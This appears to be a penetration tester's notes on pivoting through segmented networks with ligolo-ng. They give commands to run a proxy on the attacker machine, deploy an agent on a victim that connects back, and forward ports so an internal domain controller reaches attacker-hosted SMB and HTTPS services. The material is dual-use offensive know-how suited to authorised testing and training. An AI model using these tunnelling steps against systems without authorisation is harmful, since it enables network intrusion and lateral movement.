In time, due to network segmentation and routing tables, we might have a need to perform Pivoting, mainly ligolo-ng would be used at it is currently the most convenient and best tools available for our purpose, however SSH Port Forwarding and Chisel would also be included as backup shall ligolo-ng fail

-Using ligolo-ng for pivoting

First we need to initiate a proxy on our attacker machine:
```
sudo ./proxy -selfcert #default port is 11601, change by specifying -laddr 0.0.0.0:<port>
```
Next, we need to transfer agent to our victim, then we run:
```
./agent -connect <ip>:<port> -ignore-cert
```
Then we select session in proxy, then use autoroute to configure:
```
session
autoroute #if previously the proxy is not opened with sudo, this stage will fail as autoroute creates new network interface, which requires sudo privilege
```

In some cases, the host we are reaching may simply not have a route to our attacker machine(10.10.16.27), e.g. : DC01(10.125.10.25) that is connected via Exchange01(10.125.10.1 / 10.10.16.25) (where ligolo-ng agent is deployed), In this case we can reach DC01 actively but DC01 can't reach us back, in this case we can issue listener_add at our proxy to do port forwarding:

```
listener_add -addr <agent_interface_ip_or_0.0.0.0>:<port> --to <kaliip>:<port> --tcp
Example: listener_add -addr 10.125.10.1:4444 --to 10.10.16.27:4444 --tcp
```

This allows us to deploy services (like smb server or http server), when accessing resources, we can now use Exchange01's ip with designated forwarding port

```
#On DC01 (Assume proper port forward is set):
net use G: \\10.125.10.1\netdata /user:apple #smbserver
(On browser) https://10.125.10.1:4444 #goshs https server
```